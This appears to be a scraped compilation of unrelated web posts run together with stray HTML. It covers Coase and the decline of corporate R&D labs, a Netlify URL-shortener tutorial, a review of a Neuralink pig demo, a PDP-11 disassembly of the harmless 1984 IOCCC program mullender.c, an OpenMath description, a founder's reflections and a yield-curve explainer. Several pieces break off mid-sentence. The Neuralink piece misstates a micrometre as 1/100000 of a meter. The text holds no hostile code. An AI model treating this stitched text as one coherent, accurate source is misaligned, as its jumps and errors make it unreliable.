<p><span>Coase answers the question of why businesses exist as he answers the question of why people simply don’t contract away all externalities: transaction costs. If there is a cost on both sides every time one person wants to pay another for a task, then some tasks will not be worth paying for, or worth doing at the going rate. Concretely: an employer who does not negotiate contracts for each and every individual work unit can afford to offer higher wages, and an employee who does not do so can afford to accept lower wages. Companies organized in this way thus outcompete pure market organization—in cases where transaction costs are large.</span></p>
<p><span>In many ways, this general story for why firms exist also explains why large firm R&amp;D labs were so successful. The transaction costs of collaboration are extremely large, and prevent all sorts of potentially-valuable crossovers: not just the financial costs of contracting with others, but the costs of finding people you work well with, of corresponding and collaborating with people far from you, and so on. University lecturers collaborate more with those in their department than in other departments, and more with those in their university or city than elsewhere, despite all the tools and technologies the internet has brought. Chance meetings are another driver of serendipitous discovery and unexpected but fruitful collaborations.&nbsp;</span></p>
<p><span>What’s more, without great efforts in ‘translation’, many scientific ideas can be completely disconnected from practical applications. A research lab brings an array of scientific experts together from different disciplines, for collaboration and drawing on expertise at low cost. Fellow researchers bump into one another. And the firm context means the potential impact in terms of usable products is always taken into account.</span></p>
<h3>The DARPA Era</h3>
<p><span>The era of the R&amp;D lab has one particularly legendary story and paradigmatic example: PARC. Xerox’s Palo Alto Research Centre—the location in Palo Alto, now the home of companies like Tesla, Palantir, and Google, is no coincidence—developed many of the foundational building blocks of today’s technology and economy. In the 1970s, PARC researchers built the first computer with a graphical user interface, the first laser printer, the first Ethernet cable, and the first user-friendly word processor. Steve Jobs visited PARC in 1979, aged 24, and incorporated many of the ideas into Apple products. Charles Simonyi, a key developer at PARC, moved to Microsoft, where he developed the Office suite. But Xerox itself, which is still largely known for making photocopiers, did not capitalise on these inventions.</span></p>
<p><span>PARC, in turn, had hired many of its workers from Augmentation Research Centre, a publicly-funded project which pioneered the computer mouse, hyperlinks, the earliest predecessor to the internet, and many smaller innovations we take for granted in today’s computer ecosystem. ARC was funded by ARPA, the Advanced Research Projects Agency, now DARPA. Though DARPA (then ARPA) is funded by the US Department of Defence, it shares many elements with golden era R&amp;D labs. They are organised around a mission and a goal—even the most basic research is done with an end in mind—but researchers are given a lot of freedom to make their own decisions.</span></p>
<h3>A return to the market for ideas</h3>
<p><span>The scale of the change since the 1970s is huge—big businesses have retreated from research. In the 1960s, DuPont, the chemicals giant, published more in the </span><i><span>Journals of the American Chemical Society</span></i><span> than both MIT and Caltech combined. R&amp;D magazine, which awards the R&amp;D 100 to the hundred innovations it judges most innovative in a given four year period, gave 41% of its awards to Fortune 500 companies in its 1971 iteration and 47% in 1975. By 2006, 6% of the awards were going to firms in the Fortune 500. The great majority of these awards are now being won by federal labs, university teams, and spin-offs from academia. The lone inventor is back.</span></p>
<p><span>This is reflected by declines in the shares of patents going to the biggest businesses, and in the shares of scientists working there. In 1971 just over seven per cent of scientists in industry tracked by the US National Science Foundation worked in firms with under 1,000 employees; by 2004 this was 32%. In 2003 around a quarter worked at firms with fewer than ten employees. Even pharmaceuticals, the one area where large internal research labs are still significant, has been affected—around half of the drugs approved so far in the 2010s were originally discovered by small biotech startups.</span></p>
<p><span>In general, participation by large American firms in …</span></p></div></div></div>

We will be using <a target="_blank" href="https://docs.netlify.com/routing/redirects/">Netlify Redirects</a> and a package called <a target="_blank" href="https://github.com/kentcdodds/netlify-shortener">netlify-shortener</a>.</p>
<p>I have always wanted to create my own URL shortener and use it to shorten all my links. But I always felt like creating it would take a lot of effort, although I never actually gave much thought to it. </p>

<p>But I came across a tweet containing a link to the video which showed how to create a simple URL shortener. This blog post is my attempt to share that approach with you.</p>
<p>Before we see how to create your own URL shortener, let's see why having a URL shortener can be useful.</p>
<p>If you are already convinced that having your own URL shortener can be useful, you can skip this section and directly jump to <a href="#creating-your-own-url-shortener">Creating Your Own URL Shortener</a> section.</p>
<h2 id="benefits-of-shortening-your-urls">Benefits of Shortening Your URLs</h2>
<h3 id="it-masks-the-original-links">It masks the original links.</h3>
<p>Masking the URL has many advantages</p>
<p>For example, take this URL - <code>hashnode.com/series/how-i-made-a-markdown-editor-with-ability-to-embed-youtube-videos-codepens-etc-cke6g1y2x00afxms17vp30803</code></p>
<p>This URL is the link to the series that I am writing on <a href="https://hashnode.com/@hashnode">Hashnode</a> where I am developing a full-featured Markdown editor from scratch. But, the URL is so long and difficult to read and share on platforms like twitter. </p>
<p>Instead, wouldn't it be nice to have a simple short URL like <code>pbt.im/markdown-series</code> which redirects to the above URL. It's short, crisp, readable, and also equally conveys what one can expect in that link.</p>
<h3 id="sharing-affiliate-links">Sharing affiliate links.</h3>
<p>Other places where URL shortening can be useful is when you want to share or brand an ugly affiliate link, or when the domain of the link that you want to share is very long.</p>

<p>Take a look at some of the shortened links that I frequently use. </p>

<p>Sharing the above links is so easy. You don't even have to copy them. You can just type them out yourself. They are short, consistent, readable and can easily be remembered.</p>
<h3 id="links-can-change">Links can change</h3>
<p>Another disadvantage of sharing normal links is that the links can potentially change in the future. </p>
<p>If they do change, you can't hunt down every post and every place where you posted or shared that link and then update it. And it might not always be feasible to redirect the old URL to a new URL. </p>
<p>Shortened links can come in very handy in this situation. The shortened link that you share need not change ever. Whereas the URL that the short link should redirect to can change as you wish.</p>
<h3 id="bookmarks">Bookmarks</h3>
<p>I even started using my URL shortener to create bookmarks. I added a short URL(<code>/bookmarks</code>) that redirects to a GitHub page which contains all my other short URLs. Then whenever I want to bookmark a very useful URL, instead of bookmarking it normally, I started shortening it, which will automatically add it to my list of short URLs (which means it will also be available at <code>/bookmarks</code>)</p>
<p>Now that we saw some of the reasons of how shortened URLs can help us, let's see how to create one yourself.</p>

<p>This is the tweet that inspired me to explore and create a URL shortener for shortening my links. I finally ended up using the approach that Kent suggested. I will be explaining the same in this article.</p>
<h3 id="netlify-redirects">Netlify Redirects</h3>
<p>Before we jump into the actual content, let's see what Netlify redirects are. Netlify gives us an easy way to handle redirects for any site that is hosted on the platform. All you have to do is create a <code>_redirects</code> file and then add the redirect rules in that file.</p>
<blockquote>
<p>In a <code>_redirects</code> file, each redirect rule must be listed on a separate line, with the original path followed by the new path or URL. Any line beginning with # will be ignored as a comment.</p>
<p>Here is an example:</p>
<pre><code>
<span>/home              /</span>
/blog/my-post.php  /blog/my-post
/news              /blog
<span>/cuties            https:/</span>/www.petsofnetlify.com
</code></pre></blockquote>
<p>This is the bare minimum that you need to create your own URL shortener. </p>
<ul>
<li>Create an empty project with a single file called <code>_redirects</code>.</li>
<li>Add your short and complete URLs there.</li>
<li>Deploy that project to Netlify. </li>
</ul>
<p>You now have your own simple URL shortener. </p>
<p>Every time you want to add a new URL, you can just add it in the <code>_redirects</code> file and then deploy it. If using this workflow is good enough for you, you can stop here and use it.</p>
<p>But Kent went a step further and created a package called <a target="_blank" href="https://github.com/kentcdodds/netlify-shortener">netlify-shortener</a> which simplifies the workflow of creating short URLs even further.</p>
<p>Follow these steps to start using <code>netlify-shortener</code> and set up your own URL shortener</p>
<h4 id="step-1-create-an-empty-project">Step 1: Create an empty project</h4>
<pre><code>mkdir url-shortener
<span>cd</span> url-shortener
</code></pre><h4 id="step-2-initialize-it-as-npm-project">Step 2: Initialize it as npm project</h4>
<pre><code>npm <span>init</span> -y
</code></pre><h4 id="step-3-create-a-redirects-file-and-add-the-following-content">Step 3: Create a <code>_redirects</code> file and add the following content.</h4>
<pre><code>
/*       https://your-website.com
</code></pre>
<p><code>your-website.com</code> will act as a fallback when the URL doesn't match any of the available short URLs. Replace it with whatever URL you want to have as a fallback.</p>
<h4 id="step-4-add-homepage-and-shorten-script-to-your-packagejson-add-your-own-short-domain-url-to-the-homepage">Step 4: Add homepage and shorten script to your package.json (Add your own short domain URL to the homepage)</h4>
<pre><code>{
  "<span>homepage</span>": <span>"https://pbt.im"</span>,
  "<span>scripts</span>": {
    "<span>shorten</span>": <span>"netlify-shortener"</span>
  }
}
</code></pre>
<p>Now, you can run the following commands.</p>
<pre><code>
<span>npm</span> run shorten 


<span>npm</span> run shorten https:<span>//</span>yahoo.com


<span>npm</span> run shorten https:<span>//gi</span>thub.com gh
</code></pre><p>The <code>npm run shorten</code> command</p>
<ul>
<li>Generates a shortcode automatically if it is not provided.</li>
<li>Validates your URL.</li>
<li>Automatically check for URL collisions and throws an error if there is a collision.</li>
<li>Adds the URL to the top of the <code>_redirects</code> file and reformats the file properly.</li>
<li>Pulls the changes from remote, adds the new shortened URL, commits the code, and then pushes the commit to the remote again.</li>
<li>Automatically copies the short URL to your clipboard.</li>
</ul>
<p>You don't even have to provide <code>https://</code>, by default it assumes that the original link is <code>https://</code></p>
<p>You can even add it as a global command in your shell using <a target="_blank" href="https://github.com/kentcdodds/netlify-shortener#shell-function">these instructions</a></p>
<h3 id="my-workflow-for-shortening-a-url">My workflow for shortening a URL</h3>
<p>Open the terminal and simply write <code>shorten original-URL short-slug</code>. </p>
<p>For example, to shorten the link to my Github profile, I will run the following command </p>
<pre><code><span>shorten</span> github.com/pbteja1998 gh
</code></pre><h2 id="tl-dr">TL; DR</h2>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p><img src="https://theodormarcu.com/images/neuralink/neuralink1.jpg" alt="Neuralink Press Image">
<sub>Images courtesy of Neuralink.</sub></p><p>You probably heard about <a href="https://techcrunch.com/2020/08/28/elon-musk-demonstrates-neuralinks-tech-live-using-pigs-with-surgically-implanted-brain-monitoring-devices/" target="_blank">the latest Neuralink demo</a>
by now. I’m referring to the one where Elon Musk showed pigs with brain implants walking around and making cute noises. But why should you care? Is this just another publicity stunt by a rich billionaire with eccentric pet projects, or does it actually matter?</p><iframe width="100%" height="auto" src="https://www.youtube.com/embed/DVvmgjBL74w?start=947" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><p><sub>Click above to see the part of the presentation where the pig sniffs around and sounds play whenever the neurons associated with his snout fire. Trust me, it’s adorable. From now on, this is the sound I’ll play in my mind whenever I see animals sniffing around.</sub></p><p>The Neuralink demo is a big deal for several reasons. Most importantly, it shows a fully-working brain-machine interface product in a living being. I cannot emphasize how incredible this is. Creating a brain implant is a hard task. Not only do you have to figure out how to stick something in a brain without hurting it, but keeping that thing in place, building the software to interpret the signals coming from it, and then removing it with minimal damage is an endeavor that presents serious challenges at every step of the way. Making all of the above into a <em>product</em>, not a week-long surgery research project, is a truly Promethean achievement.</p><p>The fact that Neuralink is closer to delivering a product and not just research matters a lot. We’ve heard about advances in brain-machine interface research for decades now, but all the results have been highly experimental. Building a product and not an experiment means that all those results, from restoring speech to restoring movement, are closer to being used by those who actually need them. Furthermore, reducing the barriers to obtaining neural data from humans creates an unprecedented opportunity to better understand our own minds, not to mention traditionally elusive topics like consciousness.</p><p>One of the first things that stood out to me in the demo was how Neuralink inserts the brain-machine interface device into the brain. Insertion is something Neuralink has brought up in past presentations, but this time they showed a particularly good video of how it works. In order to insert sensors in a brain without damaging it, the Neuralink team has built electrodes in the shape of small wires that are 1/4 of the diameter of human hair. These electrodes are then inserted through a skull opening using a high-precision robot that scans the brain area <em>during</em> surgery, which allows it to avoid any blood vessels, no matter how small. This procedure reduces tissue damage and increases the probability that the implant won’t be outright rejected by the brain. To see how cool this is, just watch the demo below:</p><video id="video" muted="" preload="auto" poster="https://j.gifs.com/p8ADyp.jpg" loop="" autoplay="" playsinline="">
<source src="https://j.gifs.com/p8ADyp.mp4" type="video/mp4"></video><p>The robot misses the blood vessels every time! This takes place in an area where distances are measured in micrometers - 1/100000 of a meter. This procedure is not something that would work without major advances in robotics and computer vision. Having a human do it by hand is out of the question. I suggest you go back to the <a href="https://youtu.be/DVvmgjBL74w?t=646" target="_blank">original demo</a> and watch the high-definition video to see just how good the robot is at this job.</p><p>The fact that the robot can implant a <em>Link</em> (Neuralink’s name for the sensor) in under an hour is a great achievement too. Neuralink’s goal is to make getting a brain-machine interface as easy as getting Lasik eye surgery. This demo showed that they’re not joking about delivering on this promise.</p><p>Another thing that truly stood out to me is how secure and inconspicuous the <em>Link</em> interface looked on the pig’s head. I couldn’t even spot it! This is really important, since if you’re about to make something that living beings are supposed to wear every day, you might as well make sure it’s not awkward or annoying. Even better, the interface should feel like it’s part of your own body.</p><p><img src="https://theodormarcu.com/images/neuralink/neuralink2.jpg" alt="Neuralink Press Image">
<sub>The new <em>Link</em> brain-machine interface.</sub></p><p>This is an area that did not receive a lot of attention before Neuralink. For example, when hospitals perform invasive brain-recordings using traditional methods like ECoG, wires come out of your head through skull openings. Since the brain is a squishy mass surrounded by liquid, keeping the liquid <em>in</em> and the area around the opening <em>clean</em> becomes an incredibly difficult task. Nurses have to hover around patients constantly to make sure that the wires are not coming loose and that the brain ooze is being cleaned so that no infections take place.</p><p>What makes the <em>Link</em> so revolutionary is that it’s a standalone device. By removing the need for charging or data transfer wires, this brain-machine interface is closer to an Apple Watch-level wearable than anything else that has been built so far. Seeing the charging puck (which seems to have copied the Apple Watch charging puck) offered perhaps the clearest glimpse of the future in the entire presentation (so did the 1-day battery life, which, while amazing for a device this size, will also lead to some really funny memes about how our brains will run out of battery and need to be charged).</p><p><img src="https://theodormarcu.com/images/neuralink/neuralink3.jpg" alt="Neuralink Inductive Charging Mechanism">
<sub>Is this going to be worse than forgetting to charge your phone at night?.</sub></p><p>Having something that fits neatly in your skull and blocks liquid from coming out without the need for wires is a major achievement. I’m sure there is still a lot of work to be done, especially given Elon’s calls for help from sealing experts, but seeing something as good as what we’ve seen today shows a great degree of progress.</p><blockquote><p lang="en" dir="ltr">If you’ve solved hard problems with phones / wearables (sealing, signal processing, inductive charging, power mgmt, etc), please consider working at engineering@neuralink.com</p>— Elon Musk (@elonmusk) <a href="https://twitter.com/elonmusk/status/1284306733720940544?ref_src=twsrc%5Etfw">July 18, 2020</a></blockquote><p>Another noteworthy aspect of the <em>Link</em> interface is the signal processing. In this regard, the pig-sniffing-with-sounds demo was ok, since it didn’t really use any fancy techniques. What really stood out was predicting and interpreting brain signals using the information from the <em>Link</em> sensors.</p><video id="video" muted="" preload="auto" poster="https://j.gifs.com/vl0MOm.jpg" loop="" autoplay="" playsinline="">
<source src="https://j.gifs.com/vl0MOm.mp4" type="video/mp4"></video><p>These demos can get a bit hand-wavey and Neuralink did not provide a lot of information about the techniques used to produce this particular example. However, given the fact that deep learning has been shown to be really good at brain signal decoding and prediction, I wouldn’t be suprised if Neuralink and OpenAI partenered on advancing signal processing using deep learning once the hardware is ready. Given Elon’s obsession with the singularity, I wouldn’t be surprised if this happened sooner.</p><p>Overall, I’m really excited about the future of invasive brain-machine interfaces after seeing this demo. While the jump from animals to humans is a big one and I’m sure Elon errs on being overly-optimistic when it comes to the timeline, this is a historical moment similar to launching the first dog into space. The fact that this is possible today opens an endless array of opportunities for the future of humanity.</p></div></div>]]>

<p>A few years ago I wrote <a href="https://medium.com/@LainIwakura/deobfuscating-obfuscated-code-for-fun-and-no-profit-36ec615c8f5d">two</a> <a href="https://medium.com/@LainIwakura/deobfuscating-code-for-fun-and-no-profit-round-2-60d78b67ebce">posts</a>
on medium.com explaining the workings of some obfuscated programs. After these posts other stuff took priority and I forgot about the world of obfuscation for a while. Now though, I find myself returning to it.
For reasons I’ll explain in a different post I find studying obfuscated code to be quite valuable. So, I thought to myself ‘Well, those last programs I examined were honestly pretty simple. What would it be like to research a truly obfuscated program?’</p>
<p>This post is the story of that journey. I will discuss the code, how I got such old and obscure code to run, as well as include snippets from my conversations with
one of the original authors (who was very helpful in figuring some of this out). If all that wasn’t enough I managed to obtain the original PDP and VAX source code, it will be hosted here with permission. I want to give a huge thank you to Sjoerd Mullender and Don Libes for their assistance and permission in reproducing some of this material.</p>

<p>Because older obfuscated programs tend to be easier to dissect I decided to stay in the early years of the IOCCC (International Obfuscated C Code Contest).
Among those early programs one sticks out as truly interesting - and that is the first IOCCC winner <a href="https://www.ioccc.org/1984/mullender/mullender.c">mullender.c</a>, which I’ve also replicated below because it’s quite short.

<p>Where do you start with a program like this? Well, the <a href="https://www.ioccc.org/1984/mullender/hint.text">hint</a> provided by the IOCCC is always a good first step.
From this hint, we can learn a few things necessary to understanding how the program works:</p>
<ul>
<li>Perhaps most importantly, this program will only run on a PDP-11 or VAX-11.</li>
<li>The C startup routine - provided by crt0.o - transfers control to a location named ‘main’ - usually intended to be a function, but in this case it’s an array of shorts</li>
<li>These shorts (represented in different formats to enhance obfuscation) form a meaningful set of PDP-11 and VAX-11 instructions</li>
<li>The first instruction is a branch to the PDP code, and due to the way VAX calls the main ‘function’ it skips the first word of the program (I’ll discuss this more later).</li>
<li>The program prints a string</li>
</ul>
<p>Essentially, the program is a bunch of machine code instructions encoded in various formats. It runs because this code predates ANSI C by a half decade and old compilers seem to have had significantly less qualms about
‘main’ being a function or not (I tried to define ‘main’ as an array of shorts with a modern compiler and it did not like that one bit).</p>

<p>I admit it, the PDP-11 was before my time. I grew up in the Windows 95/98/2000 era, and until recently I didn’t even know what a PDP-11 was.
This ignorance left me kind of stuck, and a brief look on eBay confirmed that I was not going to get a working PDP-11 any time soon. Fortunately though,
an emulator exists. Enter <a href="http://simh.trailing-edge.com/">SimH</a>, it’s more of a suite of emulators for a wide range of historical computers - of which the
PDP-11 is one, and lucky for us the VAX-11 is another.</p>
<p>After a few false starts and misadventures with 2.11BSD, I realized I had no idea what I was doing so I decided I needed some help.
The two original authors of this program are Robbert van Renesse and Sjoerd Mullender, why not try to contact them? So I did.
Robbert didn’t answer my e-mail, but luckily Sjoerd got back to me and was happy to discuss the program. He told me that the
PDP-11 OS they used was Unix v7, so I proceeded on that route.</p>
<p>I managed to <a href="http://a.papnet.eu/UNIX/v7/Installation">find a guide</a> on installing Unix v7 onto this emulator that worked;
and now with my emulator running, and OS installed, I could slap it into a file, compile, and run the thing. Below is what I got.</p>

<figure>
	<img src="https://lainsystems.com/img/running_on_pdp11.gif">
	
		<figcaption>Running the program on the PDP-11 using Unix v7</figcaption>
	
</figure>


<p>The animation is a little choppy, but even still you can hopefully see that it is printing “:-)” across the screen until it is forced to exit (there is no clean way to stop it).</p>
<p>In my discussions with Sjoerd, it was revealed that the string it prints is not exactly “:-)” but instead "  :-)\b\b\b\b”
(NOTE: there should be 2 space characters at the start but my templating engine is removing one for some reason).
It is exactly 9 bytes long. The first 2 characters are whitespace, followed by the :-), finally followed by four ‘\b’
characters. The ‘\b’ characters indicate a backspace. What does the backspace accomplish? Well, if you count 4 characters back from when they begin you’ll see we’re left with a single space - it is at this point
that the program loops and prints the string again. This happens quickly enough that to our eyes it looks like the “:-)” is scrolling across the screen - a clever effect.</p>

<p>As it turns out, the C code is not very useful to examine directly. As it also turns out, the assembly isn’t much better. Below is a small sample of what the assembly looks like (from the PDP-11’s perspective):</p>
<pre><code>    .text
    .globl  _main
    .data
    .even
_main:
    .word   0425 
    .word   04735
    .word   -010041
    .word   031
    .word   0
    .word   0735
    .word   01773
    .word   05757
</code></pre><p>So, what to do? Well, you can actually set up a cross compiler for the PDP-11 and if you go through that effort you can use the objdump program targeted at PDP-11 binaries.</p>
<p>Below is the relevant portion of the objdump - the whole thing is <a href="https://lainsystems.com/mull_objdump.txt">here</a>, but not all of it is useful. Sjoerd confirmed that the PDP code is
from _main+0x2c to _main+0x4a (inclusive). Of course, the first word is also a PDP-11 instruction. Everything I’ve ommitted is related to the VAX portion of
the program which we will get back to. (It’s also not proper VAX code since the disassembler thinks everything is PDP-11).</p>
<pre><code>   0:   0115            br  0x2c
  2c:   11c4            mov pc, r4
  2e:   0be4            tst -(r4)
  30:   e5c4 0009       sub $11, r4
  34:   1137 0006       mov r4, $0x3e
  38:   15c0 0001       mov $1, r0
  3c:   8904            sys 4
  3e:   0000            halt
  40:   0009            .word   11
  42:   15c2 0200       mov $1000, r2
  46:   892d            sys 55
  48:   7e82            sob r2, 0x46
  4a:   01f0            br  0x2c
</code></pre><p>Before going further there are 2 important things to know about PDP-11 assembly code:</p>
<ul>
<li>The PDP-11 works primarily with octal. All the addresses and instructions are encoded in octal.</li>
<li>In an instruction like <code>mov pc, r4</code>, you are moving pc INTO r4, not r4 into pc. Personally, I got used to this pretty quickly.</li>
</ul>
<p>The first number in the original program is 277, put that into a hex converter and you’ll get 115 like we see in the objdump. More interesting though is what you get translating it into octal - 425.
How does 0425 get you br 0x2c though? Well for that you need to grab some <em>manuals</em>. I got my hands on a lot of old manuals for these computers but the most useful one was the PDP-11/45 Handbook from 1973.
It would helpfully describe the instruction format, and exactly what it did. Below is an example of the page for the unconditional branch instruction.</p>

<p>As you can see, it sets the program counter to pc + 2x the offset - which is 25 (octal) in our case. Since the program counter at the start of our program is 2 (because it points to the next word to execute),
we get 2 + (25 x 2), or 2 + 52 = 54, which translating back into hex gives us 2c. Cool!</p>

<p>Now that we know how the branch works we can examine the main stuff - I won’t go into huge depth with the manuals for each little instruction but doing so is fun if you’re bored and enjoy that sort of thing.</p>
<p>The next relevant portion of code is this:</p>
<pre><code>  mov pc, r4
  tst -(r4)
  sub $11, r4
  mov r4, $0x3e
  mov $1, r0
  sys 4
  halt
  .word   11
</code></pre><p>We move the program counter into the r4 register and then use the ‘test’ (tst) instruction. This has the effect of clearing the some flags in the PSW (processor status word), and because
the register is using ‘Autodecrement mode’ it will subtract 2 from the value stored at r4. When using autoincrement / decrement, it will go by 1 in byte instructions or 2 in word instructions.
After this we subtract 11 from r4, but 11 is actually 9 (used to octal yet?). Then we store r4 into…0x3e? Well, if you look back at the objdump you’ll see that 0x3e is ‘halt’ or 0000. This
mov instruction overwrites that value with the contents of r4. We move 1 into r0 (1 indicating STDOUT), and call ‘sys 4’. The next line will be the value of r4 as just mentioned, and <code>.word 11</code>
simply inserts octal 11 directly into that spot. If you’re wondering what exactly is in r4 and why we’re doing all this stuff, be patient - we’re getting there.</p>
<p>If you’re familiar with system calls, you probably know what’s going on. If not, all of this is to setup the <a href="https://en.wikipedia.org/wiki/Write_(system_call)">write</a> system call. I
actually made a <a href="https://retrocomputing.stackexchange.com/questions/15590/trying-to-understand-some-assembly-syntax-in-the-unix-v7-write-system-call">post on the retro-computing stackexchange</a>
asking about the workings of this call internally - I recommend checking it out if you want further clarity on how this works.</p>
<p>After this we have the final 3 lines of PDP code which are:</p>
<pre><code>  mov $1000, r2
  sys 55
  sob r2, 0x46
</code></pre><p>We put 1000 into r2, and call system call 55. After this, we use the ‘sob’ instruction - which is ‘subtract one and branch’ and not an invitation to cry - to see if r2 is 0 yet. If it isn’t, we branch
to the previous line and call system call 55 again. loop until r2 is 0. Syscall 55 eh? Which …</p></div></div></div>

  <p>OpenMath is an emerging standard for representing mathematical objects with their semantics, allowing them to be exchanged between computer programs, stored in databases, or published on the worldwide web. While the original designers were mainly developers of computer algebra systems, it is now attracting interest from other areas of scientific computation and from many publishers of electronic documents with a significant mathematical content. There is a strong relationship to the MathML recommendation from the Worldwide Web Consortium, and a large overlap between the two developer communities. MathML deals principally with the presentation of mathematical objects, while OpenMath is solely concerned with their semantic meaning or content. While MathML does have some limited facilities for dealing with content, it also allows semantic information encoded in OpenMath to be embedded inside a MathML structure. Thus the two technologies may be seen as highly complementary.</p>

<p>Mathematical objects encoded in OpenMath can be</p>

<ul>
  <li>displayed in a browser</li>
  <li>exchanged between software systems</li>
  <li>cut and pasted for use in different contexts</li>
  <li>verified as being mathematically sound (or not!)</li>
  <li>used to make interactive documents really interactive.</li>
</ul>

<p>OpenMath is highly relevant for persons working with mathematics on computers, for those working with large documents (e.g. databases, manuals) containing mathematical expressions, and for technical and mathematical publishing.</p>

<p>The worldwide OpenMath activities are coordinated within the OpenMath Society, based in Helsinki, Finland. It is coordinated by an executive committee, elected by its members. It organizes regular workshops and hosts a number of electronic discussion lists. The Society brings together tool builders, software suppliers, publishers and authors.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I had an hour-long conversation yesterday talking to a fellow entrepreneur who quit the adventure and took a job. He was curious to know what I had done differently to arrive at a positive outcome.</p><p>My first reaction was to tell him that this is not my first attempt. </p><p>I've tried building a company twice before and failed miserably. I even tried building a breakfast delivery business in 2015 (I had no idea what I was doing back then) and I made ₹85,000 in revenue before I shut it down.</p><p>SuperLemon is actually my fourth attempt. Sankalp and I did just enough things right this time (or avoided just enough mistakes) to make the business work. </p><p>The journey to reaching here was long, filled with doubt internally and from everyone around me, even frustrating and hopeless at times.</p><p>Out of all the things we talked during the call, the three things that stood out to me were:</p><h3><strong>1-</strong> I kept trying again and again</h3><p>If something didn't work, I would find a job to save up and try again as soon as I have a year's worth of runway and a strong enough conviction about the idea. </p><p>As of today, I don't see any other path in life but building businesses.</p><h3><strong>2-</strong> I knew when to quit</h3><p>When things weren't working out no matter our best effort, clearly there was something wrong. I spent 12 months on my second venture before realising there's no market demand. </p><p>But I quit my third venture (right before SuperLemon) in about 4 months when it was obvious to me that it wasn't going to work.</p><h3><strong>3-</strong> Introspect </h3><p>After every attempt or failure, I would spend between 1-3 months in intense introspection of what went wrong. </p><p>This wasn't an exercise to beat myself up over it, but rather to learn what I need to do differently the next time for things to work out more favourably.</p><h3>If you're a budding entrepreneur</h3><p>I don't recommend this path to anyone unless they are willing to take all the pain and failures, learn from them, and try again with the hope to eventually get it right.</p><p>Quit sooner than later when something isn't working, but only if you've understood why it won't work. </p><p>Ask always yourself if you're in it for the long haul. Otherwise you might as well quit right now.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2> What is the yield curve?</h2><p>The Yield Curve shows current yield rates, for US Treasuries, at varying maturities. That was a lot of jargon, so let's break it down.</p><canvas></canvas><p>US Treasuries represent bonds issued by the US Government. Think of a bond as any loan - the issuer of a bond has to pay interest each month, and the amount borrowed at maturity. Maturity refers to the period after which the bond is to be paid back. The US Government issues bonds for varying maturity rates, from 30 days to 30 years. And finally, the yield rate represents the effective interest rate for a bond, based on its current price.</p><h2>Why does it matter?</h2><p>The yield curve sets the basic, or lowest possible, interest rates. Any changes in the yield curve have a ripple effect across the entire economy.</p><p>Effectively, the yield curve represents current interest rates for the US Government. The US Government is considered the safest borrower in the economy. So, it gets to borrow money at the lowest possible interest rates. Everyone else has to pay more interest, to compensate for the added risk. </p><p>Let's take a concrete example. On September 4, 2019, Apple issued bonds worth $7bn. These bonds had maturities ranging from 3 years, to 30 years. The yield rate on these bonds was higher than the US Government bond yields on the same day.</p><canvas></canvas><p>Similarly, if you want to take out a 30 year mortgage, your interest rate will be some number plus the interest rate of the 30 year treasury.</p><p>So when the yield curve rises, that means interest rates for everyone go up. It becomes more expensive for Apple to borrow money, or for you to get a mortage. If it's more expensive to borrow money, it's more expensive to spend money; and in this way, higher interest rates make economic growth harder.</p><p>The yield curve also matters because it's considered a predictor for future recessions.</p><h3>How is the yield curve a recession indicator?</h3><p>The shape of the yield curve offers some clues. In normal times, the yield curve slopes upwards. Remember, the higher risk the, the higher the interest rate. Shorter periods are safer - it's easier to predict what will happen in the next 30 days, than in the next 30 years.</p><p>When the yield curve is <em>inverted</em>, something is wrong. It means that rates for long term-periods are lower than interest rates for short-term periods. This is rare, and breaks the relationship we described above. It's so abnormal, that it is a reliable predictor of economic recessions.</p><p>The chart below is an example of an inverted yield curve; specifically, the yield curve for August 11, 2006. Yield curves were inverted for much of 2006 and 2007. It proved prophetic. In late 2007 we entered the deepest economic recession since the 1930s.</p><canvas></canvas><p>The graph below shows the <em>spread</em> between the 10 year treasury and the 3 month treasury. The spread is just the difference between two interest rates; so anytime the spread drops below 0, it means the yield curve was inverted on that day.</p><canvas></canvas><h3>How does this matter as a personal investor?</h3><p>One way to use the yield curve is to check whether it is inverted. If the yield curve is inverted, postpone taking any loans if you can. An inverted yield curve is a sign that the rates might be lower in the future, so you'd want to wait for that to happen. It's also a sign that there might be economic trouble ahead; so ensure your savings are truly safe.</p><p>The yield curve can help you identify opportunities to refinance old mortgages or loans. If interest rates have dropped since the day you took the loan, you might have an opportunity to refinance it at a lower interest rate.</p><p>The yield curve doesn't change frequently; check it once per quarter.</p><h2>How does it change?</h2><h3>The Federal Reserve manages parts of the yield curve.</h3><p>The Fed's job is to manage inflation and maintain economic growth. They use a variety of tools to do so. For the moment, don't worry about how the Fed does it - just know that the Fed has lots of control over short term rates, but only some control over long term rates.</p><p>During a recession the Fed's goal is to get the economy growing again. In order to do so, it will cut interest rates. As explained above, high interest rates reduce spending, while low interest rates stimulate spending. When spending is stimulated, the economy grows, and things eventually return back to normal.</p><p>The Fed is good at its job, and is reliable, so the relationship described above works well. So well, that investors know the Fed will do so when a recession hits. If investors think a recession is coming 2 years from now, they'll start betting that interest rates will drop. This in fact causes <strong>yield rates</strong> to fall, resulting in an inverted yield curve. </p><p>But there are limits to what the Fed can actually do.</p><h3>What's happening during COVID-19?</h3><p>The yield curve is considered extremely flat today. The chart below shows the spread between 30 day and 30 year bonds. The lower the spread, the flatter the yield curve.</p><p>The Fed has committed to keeping interest rates as as close to 0 as possible. COVID-19 has hit the economy hard; low interest rates are needed to stimulate the economy as much as possible, but the Fed might be hitting its limits.</p><h3>What could the future look like?</h3><p>There's a notion of the <em>Zero Lower Bound</em>. Theoretically, interest rates can't drop below 0%. Negative interest rates are weird - that implies being paid to take out a loan. For a long time, it was assumed that the bound was a hard one. Meaning that once the Fed has cut interest rates to 0%, it can't do anything more to stimulate the economy.</p><p>Firstly, we've discovered that 0% might not be the lower bound. European central banks, such as the Swiss central bank, have run interest rates lower than 0% for some time now.</p><p>Secondly, the Fed has discovered new tools to stimulate the economy. A notable example is Quantitative Easing, first used in the aftermath of the 2008 financial crisis. The Fed has started to do it again; but this time around, the effects have been very different. To be explained in a future post!</p><h2>What else do I need to know?</h2><p>The Fed is one of many interacting agents in the world of interest rates; we haven't discussed inflation or gone into details about the role that investors play.</p></div></div></div>]]>

      <article role="main">
